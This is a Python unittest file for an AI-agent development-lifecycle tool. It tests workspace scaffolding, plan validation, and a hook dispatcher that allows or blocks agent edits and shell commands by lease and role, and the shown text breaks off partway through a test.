from __future__ import annotations

import contextlib
import fnmatch
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

LIB = Path(__file__).resolve().parents[1] / "packages" / "codex" / ".codex" / "ai-dlc" / "lib"
if str(LIB) not in sys.path:
    sys.path.insert(0, str(LIB))

from aidlc import hooks
from aidlc import cli
from aidlc.block_ledger import list_events, open_blocker_errors
from aidlc.git_hooks import install_project_hooks
from aidlc.io import read_frontmatter, write_frontmatter
from aidlc.overlay import overlay_init, overlay_repair, root_export, validate_overlay
from aidlc.schemas import validate_required
from aidlc.state import (
    agent_claim,
    agent_release,
    agent_report,
    assignment_create,
    assignment_list,
    bootstrap,
    finish,
    lock_list,
    lock_release,
    transition,
    validate,
    verify_gate,
    work_item_activate,
    work_item_cancel,
    workspace_status,
)
from aidlc.workspace import ai_dlc_context, cleanup_user_context, init_project, scaffold_workspace


def git_env() -> dict[str, str]:
    env = os.environ.copy()
    env.setdefault("GIT_AUTHOR_NAME", "Test User")
    env.setdefault("GIT_AUTHOR_EMAIL", "test@example.com")
    env.setdefault("GIT_COMMITTER_NAME", "Test User")
    env.setdefault("GIT_COMMITTER_EMAIL", "test@example.com")
    env["GIT_CONFIG_GLOBAL"] = os.devnull
    env["GIT_CONFIG_NOSYSTEM"] = "1"
    return env


def run(cmd: list[str], cwd: Path, env: dict[str, str] | None = None, check: bool = True) -> subprocess.CompletedProcess[str]:
    merged_env = git_env()
    if env:
        merged_env.update(env)
    return subprocess.run(cmd, cwd=cwd, check=check, capture_output=True, text=True, env=merged_env)


def read_yaml(path: Path) -> dict:
    try:
        import yaml
    except Exception:  # pragma: no cover
        return json.loads(path.read_text(encoding="utf-8"))
    return yaml.safe_load(path.read_text(encoding="utf-8")) or {}


def child_hook(repo: Path, name: str) -> Path:
    git_dir = run(["git", "rev-parse", "--git-dir"], repo).stdout.strip()
    git_path = (repo / git_dir).resolve() if not os.path.isabs(git_dir) else Path(git_dir)
    return git_path / "hooks" / name


class AidlcTest(unittest.TestCase):
    def setUp(self) -> None:
        self._home_tmp = tempfile.TemporaryDirectory()
        self._home = Path(self._home_tmp.name) / "home"
        self._home.mkdir()
        self._home_patch = patch.dict(os.environ, {"HOME": str(self._home)}, clear=False)
        self._home_patch.start()

    def tearDown(self) -> None:
        self._home_patch.stop()
        self._home_tmp.cleanup()

    def init_repo(self, path: Path, readme: str, branch: str = "main") -> None:
        path.mkdir()
        run(["git", "init", "-b", branch], path)
        run(["git", "config", "user.name", "Test User"], path)
        run(["git", "config", "user.email", "test@example.com"], path)
        run(["git", "config", "commit.gpgsign", "false"], path)
        (path / "README.md").write_text(readme, encoding="utf-8")
        run(["git", "add", "."], path)
        run(["git", "commit", "-m", "init"], path)

    def create_workspace(self, tmp: Path) -> tuple[Path, dict[str, str]]:
        root = tmp / "root-system"
        web_source = tmp / "web-source"
        backend_source = tmp / "backend-source"
        self.init_repo(root, "root\n")
        self.init_repo(web_source, "web\n")
        self.init_repo(backend_source, "backend\n")
        repos = {"web": str(web_source), "backend": str(backend_source)}
        scaffold_workspace(
            root,
            "LIN-123",
            "LIN-123-branch",
            repos,
            "literal_worktree_overlay",
            issue_url="https://linear.app/acme/issue/LIN-123",
            issue_title="Implement overlay control plane",
            base_ref="origin/main",
            root_export_target="root-export-target",
            root_export_remote="origin",
            workspace_root=str(tmp),
            repo_urls={
                "root-system": "git@example.com:acme/root-system.git",
                "web": "git@example.com:acme/web.git",
                "backend": "git@example.com:acme/backend.git",
            },
            repo_base_refs={"web": "origin/main", "backend": "origin/main"},
        )
        overlay_init(root, repos=repos)
        install_project_hooks(root, [root / "web", root / "backend"])
        return root, repos

    def create_root_system_task_workspace(self, tmp: Path) -> tuple[Path, Path, dict[str, str]]:
        root_system = tmp / "root-system"
        web_source = tmp / "web-source"
        backend_source = tmp / "backend-source"
        self.init_repo(root_system, "root\n")
        self.init_repo(web_source, "web\n")
        self.init_repo(backend_source, "backend\n")
        task_root = root_system / "worktrees" / "LIN-123"
        repos = {"web": str(web_source), "backend": str(backend_source)}
        init_project(
            root_system,
            repo_paths=repos,
            repo_urls={
                "root-system": "git@example.com:acme/root-system.git",
                "web": "git@example.com:acme/web.git",
                "backend": "git@example.com:acme/backend.git",
            },
        )
        scaffold_workspace(
            task_root,
            "LIN-123",
            "LIN-123-branch",
            repos,
            "literal_worktree_overlay",
            issue_url="https://linear.app/acme/issue/LIN-123",
            issue_title="Implement overlay control plane",
            base_ref="origin/main",
            root_export_target="root-export-target",
            root_export_remote="origin",
            workspace_root=str(task_root),
            root_system_path=str(root_system),
            root_canonical_path=str(root_system),
            root_canonical_url="git@example.com:acme/root-system.git",
            repo_urls={
                "web": "git@example.com:acme/web.git",
                "backend": "git@example.com:acme/backend.git",
            },
            repo_base_refs={"web": "origin/main", "backend": "origin/main"},
        )
        overlay_init(task_root, repos=repos)
        install_project_hooks(task_root, [task_root / "web", task_root / "backend"])
        return root_system, task_root, repos

    def dispatch_with_payload(self, root: Path, payload: dict, extra_env: dict[str, str] | None = None) -> dict[str, str]:
        raw = json.dumps(payload)
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        with patch("builtins.input", return_value=raw), patch.dict(os.environ, env, clear=True):
            return hooks.dispatch(root)

    def run_hook_dispatch(self, cwd: Path, payload: dict, extra_env: dict[str, str] | None = None) -> tuple[int, dict]:
        raw = json.dumps(payload)
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        stdout = io.StringIO()
        with (
            patch("builtins.input", return_value=raw),
            patch.dict(os.environ, env, clear=True),
            patch("aidlc.cli.Path.cwd", return_value=cwd),
            contextlib.redirect_stdout(stdout),
        ):
            code = cli.main(["hook-dispatch"])
        return code, json.loads(stdout.getvalue())

    def prepare_active_web_item(self, root: Path) -> None:
        work_items_path = root / "ai-dlc" / "work-items" / "LIN-123.yaml"
        work_items = read_yaml(work_items_path)
        work_items["items"] = [
            {
                "id": "WI-001",
                "title": "edit web",
                "repo": "web",
                "state": "not_started",
                "verifier_gate": {"phase": "verifying", "assignment_role": "dlc_verifier"},
            }
        ]
        work_items_path.write_text(json.dumps(work_items), encoding="utf-8")
        plan_assignment = assignment_create(root, "dlc_plan_writer", None, [], None)
        agent_report(root, plan_assignment["id"], "reported")
        transition(root, "plan_ready")
        scope_assignment = assignment_create(root, "dlc_scope_manager", None, [], None)
        agent_report(root, scope_assignment["id"], "reported")
        transition(root, "assigning")
        assigning_assignment = assignment_create(root, "dlc_scope_manager", None, [], None)
        agent_report(root, assigning_assignment["id"], "reported")
        work_item_activate(root, "WI-001")
        transition(root, "executing")

    def test_init_project_creates_scaffold(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "root-system"
            root.mkdir()
            init_project(root, repo_paths={"web": "/tmp/web"}, repo_urls={"web": "git@example.com:web.git"})
            self.assertTrue((root / "AGENTS.md").exists())
            self.assertTrue((root / ".codex" / "config.toml").exists())
            self.assertTrue((root / "ai-dlc" / ".gitkeep").exists())
            self.assertTrue((root / "ai-dlc" / "project-metadata.yaml").exists())
            config = (root / ".codex" / "config.toml").read_text(encoding="utf-8")
            self.assertIn("subagent_required = true", config)
            self.assertIn("hooks = true", config)
            self.assertNotIn("codex_hooks = true", config)

    def test_init_project_preserves_existing_codex_config(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "root-system"
            codex_dir = root / ".codex"
            codex_dir.mkdir(parents=True)
            config_path = codex_dir / "config.toml"
            config_path.write_text("custom = true\n", encoding="utf-8")

            init_project(root)

            self.assertEqual(config_path.read_text(encoding="utf-8"), "custom = true\n")

    def test_init_project_supports_controller_only_template(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "controller-only"
            root.mkdir()

            init_project(root, project_kind="controller-only")

            self.assertTrue((root / "AGENTS.md").exists())
            self.assertTrue((root / ".codex" / "config.toml").exists())
            self.assertFalse((root / "ai-dlc").exists())
            config = (root / ".codex" / "config.toml").read_text(encoding="utf-8")
            self.assertIn("subagent_required = true", config)
            self.assertIn("hooks = true", config)
            self.assertNotIn("codex_hooks = true", config)

    def test_packaged_codex_config_uses_current_hooks_feature_flag(self) -> None:
        repo_root = Path(__file__).resolve().parents[1]
        config = (repo_root / "packages" / "codex" / ".codex" / "config.toml").read_text(encoding="utf-8")
        self.assertIn("hooks = true", config)
        self.assertNotIn("codex_hooks = true", config)

    def test_install_and_doctor_report_current_hook_keys(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            (fake_home / ".codex").mkdir(parents=True)
            (fake_home / ".codex" / "config.toml").write_text("sandbox_mode = \"workspace-write\"\n", encoding="utf-8")
            (fake_home / ".codex" / "hooks.json").write_text("{}\n", encoding="utf-8")
            (fake_home / ".codex" / "ai-dlc" / "bin").mkdir(parents=True)
            (fake_home / ".codex" / "ai-dlc" / "bin" / "ai-dlc").write_text("", encoding="utf-8")
            (fake_home / ".agents" / "skills").mkdir(parents=True)

            with patch.dict(os.environ, {"HOME": str(fake_home)}):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["install"]), 0)
                install_status = json.loads(stdout.getvalue())
                self.assertIn("hooks_feature", install_status)
                self.assertNotIn("codex_hooks", install_status)

                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    self.assertEqual(cli.main(["doctor"]), 0)
                doctor_status = json.loads(stdout.getvalue())
                self.assertIn("hooks_json", doctor_status)
                self.assertNotIn("codex_hooks", doctor_status)

    def test_workspace_scaffold_overlay_and_assignment(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            workspace = read_yaml(root / "workspace.yaml")
            self.assertEqual(workspace["issue"]["url"], "https://linear.app/acme/issue/LIN-123")
            self.assertEqual(workspace["branch"]["root_export"]["target_ref"], "root-export-target")
            self.assertEqual(workspace["repos"]["web"]["canonical_repo_url"], "git@example.com:acme/web.git")
            self.assertTrue(workspace["workflow"]["subagent_required"])
            work_items = read_yaml(root / "ai-dlc" / "work-items" / "LIN-123.yaml")
            evidence = read_yaml(root / "ai-dlc" / "evidence" / "LIN-123.yaml")
            handoff = (root / "ai-dlc" / "handoff" / "LIN-123.md").read_text(encoding="utf-8")
            decisions = (root / "ai-dlc" / "decisions" / "LIN-123.md").read_text(encoding="utf-8")
            self.assertIn("item_template", work_items)
            self.assertIn("entry_template", evidence)
            self.assertIn("lease detail", handoff)
            self.assertIn("allow-next-agent", decisions)
            plan_meta, _ = read_frontmatter(root / "ai-dlc" / "plans" / "LIN-123.md")
            self.assertEqual(plan_meta["workflow"]["workflow_type"], "plan_implementation")
            self.assertEqual(plan_meta["orchestration"]["controller_mode"], "orchestrate_only")
            self.assertIn("phase_ownership", plan_meta["orchestration"])
            self.assertIn("approval_boundary", plan_meta)
            self.assertIn("rollback", plan_meta)
            self.assertIn("phases", plan_meta)
            self.assertEqual(plan_meta["paths"]["plan"], "ai-dlc/plans/LIN-123.md")

            self.prepare_active_web_item(root)
            self.assertEqual(validate(root), [])
            state = bootstrap(root)
            self.assertEqual(state["status"], "ready")

            created = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            listed = assignment_list(root)
            self.assertIn(created["id"], [item["id"] for item in listed])
            self.assertEqual(created["workspace_id"], "LIN-123")
            self.assertEqual(created["branch"]["issue"], "LIN-123-branch")

            with self.assertRaisesRegex(ValueError, "not allowed during plan_implementation phase executing"):
                assignment_create(root, "dlc_plan_writer", None, [], None)

    def test_init_workspace_defaults_to_root_system_worktrees_issue_directory(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            root_system = tmp_path / "root-system"
            web_source = tmp_path / "web-source"
            backend_source = tmp_path / "backend-source"
            self.init_repo(root_system, "root\n")
            self.init_repo(web_source, "web\n")
            self.init_repo(backend_source, "backend\n")
            init_project(
                root_system,
                repo_paths={"web": str(web_source), "backend": str(backend_source)},
                repo_urls={
                    "root-system": "git@example.com:acme/root-system.git",
                    "web": "git@example.com:acme/web.git",
                    "backend": "git@example.com:acme/backend.git",
                },
            )

            argv = [
                "init-workspace",
                "--issue", "LIN-123",
                "--issue-url", "https://linear.app/acme/issue/LIN-123",
                "--issue-title", "Implement overlay control plane",
                "--branch", "LIN-123-branch",
                "--repo", f"web={web_source}",
                "--repo", f"backend={backend_source}",
                "--repo-url", "web=git@example.com:acme/web.git",
                "--repo-url", "backend=git@example.com:acme/backend.git",
                "--root-canonical-url", "git@example.com:acme/root-system.git",
            ]
            with patch("aidlc.cli.Path.cwd", return_value=root_system):
                self.assertEqual(cli.main(argv), 0)

            task_root = root_system / "worktrees" / "LIN-123"
            workspace = read_yaml(task_root / "workspace.yaml")
            self.assertEqual(workspace["workspace"]["root"], str(task_root.resolve()))
            self.assertEqual(workspace["workspace"]["root_system_path"], str(root_system.resolve()))

    def test_phase_owner_assignment_is_enforced(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_assignment = assignment_create(root, "dlc_plan_writer", None, [], None)
            validate_required(plan_assignment)
            self.assertIn("ai-dlc/plans/**", plan_assignment["writable"])
            self.assertNotIn("ai-dlc/**", plan_assignment["forbidden"])
            self.assertEqual(plan_assignment["lock_scope"], "plan.lock")
            with self.assertRaisesRegex(ValueError, "not allowed during plan_implementation phase planning"):
                assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")

    def test_plan_workflow_contract_is_required(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta.pop("workflow")
            write_frontmatter(plan_path, meta, body)
            errors = validate(root)
            self.assertIn("plan.workflow is required", errors)

    def test_plan_next_agent_must_match_phase_owner(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["current"]["next_agent"] = "dlc_scope_manager"
            write_frontmatter(plan_path, meta, body)
            errors = validate(root)
            self.assertIn("plan.current.next_agent must be dlc_plan_writer for plan_implementation phase planning", errors)

    def test_transition_requires_current_phase_owner_report(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            with self.assertRaisesRegex(ValueError, "phase planning requires dlc_plan_writer report"):
                transition(root, "plan_ready")
            assignment = assignment_create(root, "dlc_plan_writer", None, [], None)
            agent_report(root, assignment["id"], "reported")
            meta = transition(root, "plan_ready")
            self.assertEqual(meta["status"], "plan_ready")

    def test_cross_cutting_plan_contract_sections_are_required(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta.pop("approval_boundary")
            meta["paths"].pop("evidence")
            meta["targets"]["writable"] = "web/**"
            meta["phases"][0].pop("checkpoints")
            write_frontmatter(plan_path, meta, body)
            errors = validate(root)
            self.assertIn("plan.approval_boundary is required", errors)
            self.assertIn("plan.paths.evidence is required", errors)
            self.assertIn("plan.targets.writable must be a list", errors)
            self.assertIn("plan.phases[0].checkpoints is required", errors)

    def test_workflow_specific_transition_graph_is_enforced(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["workflow"] = {
                "origin_mode": "docs_only_no_workspace",
                "execution_intent": "docs_only",
                "safety_domain": "docs_report",
                "workflow_type": "docs_report",
                "config_edit_stage": None,
            }
            write_frontmatter(plan_path, meta, body)
            assignment = assignment_create(root, "dlc_docs_writer", None, [], None)
            agent_report(root, assignment["id"], "reported")
            transition(root, "executing")
            meta, _ = read_frontmatter(plan_path)
            self.assertEqual(meta["status"], "executing")
            self.assertEqual(meta["current"]["next_agent"], "dlc_docs_writer")
            with self.assertRaisesRegex(ValueError, "invalid plan transition"):
                transition(root, "evaluating")

    def test_docs_report_assignment_uses_docs_writer_scope(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["workflow"] = {
                "origin_mode": "docs_only_no_workspace",
                "execution_intent": "docs_only",
                "safety_domain": "docs_report",
                "workflow_type": "docs_report",
                "config_edit_stage": None,
            }
            meta["status"] = "executing"
            meta["current"]["phase"] = "executing"
            meta["current"]["next_agent"] = "dlc_docs_writer"
            write_frontmatter(plan_path, meta, body)

            assignment = assignment_create(root, "dlc_docs_writer", None, [], None)
            self.assertEqual(assignment["lock_scope"], "docs.lock")
            self.assertEqual(assignment["deliverables"], ["docs_ref"])
            self.assertIn("ai-dlc/docs/**", assignment["writable"])
            self.assertNotIn("ai-dlc/**", assignment["forbidden"])

    def test_docs_report_agent_gate_follows_current_phase_owner(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["workflow"] = {
                "origin_mode": "docs_only_no_workspace",
                "execution_intent": "docs_only",
                "safety_domain": "docs_report",
                "workflow_type": "docs_report",
                "config_edit_stage": None,
            }
            meta["status"] = "verifying"
            meta["current"]["phase"] = "verifying"
            meta["current"]["next_agent"] = "dlc_verifier"
            write_frontmatter(plan_path, meta, body)

            blocked = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_docs_writer"}})
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("next agent must be dlc_verifier", blocked["reason"])
            allowed = self.dispatch_with_payload(root, {"tool_name": "spawn_agent", "tool_input": {"agent": "dlc_verifier"}})
            self.assertEqual(allowed["decision"], "allow")

    def test_git_finish_assignment_uses_git_operator_scope(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["workflow"] = {
                "origin_mode": "resume_existing_workspace",
                "execution_intent": "autonomous_until_git_boundary",
                "safety_domain": "git_finish",
                "workflow_type": "git_finish",
                "config_edit_stage": None,
            }
            meta["status"] = "ready_to_finish"
            meta["current"]["phase"] = "ready_to_finish"
            meta["current"]["next_agent"] = "dlc_git_operator"
            write_frontmatter(plan_path, meta, body)

            assignment = assignment_create(root, "dlc_git_operator", None, [], None)
            self.assertEqual(assignment["lock_scope"], "git.lock")
            self.assertEqual(assignment["deliverables"], ["git_result_ref"])
            self.assertIn("../.local/**", assignment["writable"])

    def test_validate_overlay_reports_missing_repos(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            root = tmp_path / "root-system"
            web_source = tmp_path / "web-source"
            backend_source = tmp_path / "backend-source"
            self.init_repo(root, "root\n")
            self.init_repo(web_source, "web\n")
            self.init_repo(backend_source, "backend\n")
            scaffold_workspace(
                root,
                "LIN-123",
                "LIN-123-branch",
                {"web": str(web_source), "backend": str(backend_source)},
                "literal_worktree_overlay",
                issue_url="https://linear.app/acme/issue/LIN-123",
                issue_title="Missing repos",
                root_canonical_url="git@example.com:acme/root-system.git",
                repo_urls={"web": "git@example.com:acme/web.git", "backend": "git@example.com:acme/backend.git"},
            )
            errors = validate_overlay(root)
            self.assertTrue(any("repo path missing" in error for error in errors))

    def test_validate_overlay_allows_nested_gitlinks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            nested_sha = run(["git", "-C", "web", "rev-parse", "HEAD"], root).stdout.strip()

            run(["git", "update-index", "--add", "--cacheinfo", "160000", nested_sha, "web/vendor-api"], root)

            errors = validate_overlay(root)
            self.assertNotIn("web: tracked as gitlink 160000", errors)

    def test_hook_dispatch_blocks_without_claim_and_allows_claimed_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)

            payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(root / "web" / "README.md")}}
            blocked = self.dispatch_with_payload(root, payload)
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("claimed lease", blocked["reason"])
            pretool_output = blocked["hookSpecificOutput"]
            self.assertEqual(pretool_output["hookEventName"], "PreToolUse")
            self.assertEqual(pretool_output["permissionDecision"], "deny")
            self.assertIn("claimed lease", pretool_output["permissionDecisionReason"])

            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            lease = agent_claim(root, assignment["id"], session_id="sess-web")
            allowed = self.dispatch_with_payload(root, payload, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(allowed, {})

            forbidden_payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "backend" / "README.md")}}
            forbidden = self.dispatch_with_payload(root, forbidden_payload, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(forbidden["decision"], "block")
            self.assertIn("lease violation", forbidden["reason"])

            write_like_bash = {"tool_name": "Bash", "tool_input": {"cmd": "python3 -c \"open('web/README.md','w').write('x')\""}}
            blocked_bash = self.dispatch_with_payload(root, write_like_bash, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(blocked_bash["decision"], "block")
            self.assertIn("write-like Bash", blocked_bash["reason"])

    def test_hook_dispatch_requires_bootstrap_gate_for_repo_worker(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)

            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            lease = agent_claim(root, assignment["id"], session_id="sess-web")
            payload = {"tool_name": "Edit", "tool_input": {"file_path": str(root / "web" / "README.md")}}
            blocked = self.dispatch_with_payload(root, payload, {"CODEX_SESSION_ID": lease["session_id"]})
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("bootstrap gate failed", blocked["reason"])

    def test_hook_dispatch_requires_git_operator_for_commit_and_root_export(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)

            worker_assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            worker_lease = agent_claim(root, worker_assignment["id"], session_id="sess-worker")
            commit_payload = {"tool_name": "Bash", "tool_input": {"cmd": f"git -C {root / 'web'} commit -m test"}}
            blocked_commit = self.dispatch_with_payload(root, commit_payload, {"CODEX_SESSION_ID": worker_lease["session_id"]})
            self.assertEqual(blocked_commit["decision"], "block")
            self.assertIn("git_operator", blocked_commit["reason"])

            root_export_payload = {"tool_name": "Bash", "tool_input": {"cmd": "ai-dlc root-export --commit"}}
            blocked_export = self.dispatch_with_payload(root, root_export_payload, {"CODEX_SESSION_ID": worker_lease["session_id"]})
            self.assertEqual(blocked_export["decision"], "block")
            self.assertIn("git_operator", blocked_export["reason"])

    def test_hook_dispatch_session_start_returns_hook_specific_output(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"hook_event_name": "SessionStart"}
            result = self.dispatch_with_payload(root, payload)
            output = result["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "SessionStart")
            self.assertIn("Plan status:", output["additionalContext"])

    def test_hook_dispatch_user_prompt_submit_returns_hook_specific_output(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"hook_event_name": "UserPromptSubmit"}
            result = self.dispatch_with_payload(root, payload)
            output = result["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "UserPromptSubmit")
            self.assertTrue(
                output["additionalContext"] == ""
                or "Active:" in output["additionalContext"]
                or "Next:" in output["additionalContext"]
            )

    def test_hook_allows_sango_worktree_create_in_root_system(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ai-dlc").mkdir()
            (root / "ai-dlc" / "project-metadata.yaml").write_text("id: test\n", encoding="utf-8")
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "sango worktree create x --from main"}}
            self.assertEqual(self.dispatch_with_payload(root, payload), {})

    def test_hook_allows_sango_worktree_list_and_status_as_bootstrap(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ai-dlc").mkdir()
            (root / "ai-dlc" / "project-metadata.yaml").write_text("id: test\n", encoding="utf-8")
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            for cmd in ("sango worktree list", "sango worktree status"):
                payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                self.assertEqual(self.dispatch_with_payload(root, payload), {})

    def test_hook_blocks_sango_worktree_remove_outside_dlc_git_operator(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "sango worktree remove x"}}
            blocked = self.dispatch_with_payload(root, payload)
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("destructive git command", blocked["reason"])

    def test_hook_allows_sango_worktree_create_inside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "sango worktree create x --from main"}}
            self.assertEqual(self.dispatch_with_payload(root, payload), {})

    def test_hook_allows_docs_directory_write_in_root_system(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ai-dlc").mkdir()
            (root / "ai-dlc" / "project-metadata.yaml").write_text("id: test\n", encoding="utf-8")
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text(
                "[guardrails]\nsubagent_required = true\nbootstrap_edit_paths = [\"ai-dlc/docs/**\"]\n",
                encoding="utf-8",
            )
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Write", "tool_input": {"file_path": str(root / "ai-dlc" / "docs" / "a.md")}}
            self.assertEqual(self.dispatch_with_payload(root, payload), {})

    def test_hook_allows_apply_patch_from_multiline_bootstrap_edit_paths(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text(
                "\n".join([
                    "[guardrails]",
                    "subagent_required = true",
                    "bootstrap_edit_paths = [",
                    '  "ai-dlc/docs/**",',
                    "]",
                ]),
                encoding="utf-8",
            )
            payload = {
                "hook_event_name": "PreToolUse",
                "tool_name": "apply_patch",
                "tool_input": {"cmd": "*** Update File: ai-dlc/docs/report.md\n+ok"},
            }
            self.assertEqual(self.dispatch_with_payload(root, payload), {})

    def test_hook_merges_user_and_project_guardrails(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            fake_home_config = fake_home / ".codex" / "config.toml"
            fake_home_config.parent.mkdir(parents=True)
            fake_home_config.write_text(
                "\n".join([
                    "[guardrails]",
                    "subagent_required = false",
                    'bootstrap_extra_commands = ["sango doctor"]',
                    'bootstrap_edit_paths = ["user-only/**"]',
                ]),
                encoding="utf-8",
            )
            repo = tmp_path / "repo"
            (repo / ".codex").mkdir(parents=True)
            (repo / ".codex" / "config.toml").write_text(
                "\n".join([
                    "[guardrails]",
                    "subagent_required = true",
                    "bootstrap_edit_paths = [",
                    '  "project-only/**",',
                    "]",
                ]),
                encoding="utf-8",
            )

            env = {"HOME": str(fake_home)}
            user_path_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "user-only" / "a.md")}},
                env,
            )
            self.assertEqual(user_path_edit, {})

            project_path_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "project-only" / "a.md")}},
                env,
            )
            self.assertEqual(project_path_edit, {})

            extra_command = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "sango doctor"}},
                env,
            )
            self.assertEqual(extra_command, {})

            blocked = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
                env,
            )
            self.assertEqual(blocked["decision"], "block")

    def test_hook_user_prompt_submit_returns_minimal_context_when_no_active_work(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"hook_event_name": "UserPromptSubmit"}
            result = self.dispatch_with_payload(root, payload)
            self.assertIn("hookSpecificOutput", result)
            ctx = result["hookSpecificOutput"]["additionalContext"]
            self.assertTrue(ctx == "" or ctx.startswith("Next:"))

    def test_hook_user_prompt_submit_detects_codex_config_edit_marker(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            payload = {
                "hook_event_name": "UserPromptSubmit",
